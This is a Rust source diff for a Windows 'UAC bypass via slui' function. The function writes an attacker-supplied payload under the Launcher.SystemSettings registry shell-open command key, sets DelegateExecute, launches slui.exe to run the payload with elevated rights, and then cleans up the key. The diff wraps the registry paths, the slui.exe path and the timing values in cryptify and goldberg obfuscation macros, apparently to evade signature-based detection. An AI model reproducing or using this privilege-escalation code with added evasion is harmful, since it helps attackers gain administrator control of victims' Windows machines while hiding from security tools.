@@ -30,9 +30,9 @@ pub fn set_hkcu_value(
 
     match (name, value) {
         (Some(n), Some(v)) => key.set_value(n, &v)?,
-        (None, Some(v)) => key.set_value("", &v)?,
-        (Some(n), None) => key.set_value(n, &"")?,
-        (None, None) => key.set_value("", &"")?,
+        (None, Some(v)) => key.set_value(cryptify::encrypt_string!(""), &v)?,
+        (Some(n), None) => key.set_value(n, &cryptify::encrypt_string!(""))?,
+        (None, None) => key.set_value(cryptify::encrypt_string!(""), &cryptify::encrypt_string!(""))?,
     }
 
     Ok(())
@@ -58,32 +58,32 @@ pub fn launch_with_fsr_disabled(program: &str) -> std::io::Result<()> {
 
 /// UAC bypass via slui
 pub fn uac_slui(payload: &String) {
-    let path = "Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command";
+    let path = cryptify::encrypt_string!("Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command");
 
-    let _ = delete_hkcu_key(path);
+    let _ = delete_hkcu_key(&path);
 
-    if let Err(_) = set_hkcu_value(path, None, Some(payload), true) {
-        let _ = delete_hkcu_key(path);
+    if let Err(_) = set_hkcu_value(&path, None, Some(payload), true) {
+        let _ = delete_hkcu_key(&path);
         return;
     }
 
-    if let Err(_) = set_hkcu_value(path, Some("DelegateExecute"), None, true) {
-        let _ = delete_hkcu_key(path);
+    if let Err(_) = set_hkcu_value(&path, Some(&cryptify::encrypt_string!("DelegateExecute")), None, true) {
+        let _ = delete_hkcu_key(&path);
         return;
     }
 
-    thread::sleep(Duration::from_secs(3));
+    thread::sleep(Duration::from_secs(goldberg::goldberg_int!(3)));
 
-    let slui_path = "C:\\Windows\\System32\\slui.exe";
+    let slui_path = cryptify::encrypt_string!("C:\\Windows\\System32\\slui.exe");
 
-    if let Err(_) = launch_with_fsr_disabled(slui_path) {
-        let _ = delete_hkcu_key(path);
+    if let Err(_) = launch_with_fsr_disabled(&slui_path) {
+        let _ = delete_hkcu_key(&path);
         return;
     }
 
     let cleanup_path = path.to_string();
     thread::spawn(move || {
-        thread::sleep(Duration::from_secs(5));
+        thread::sleep(Duration::from_secs(goldberg::goldberg_int!(5)));
         let _ = delete_hkcu_key(&cleanup_path);
     });
 }
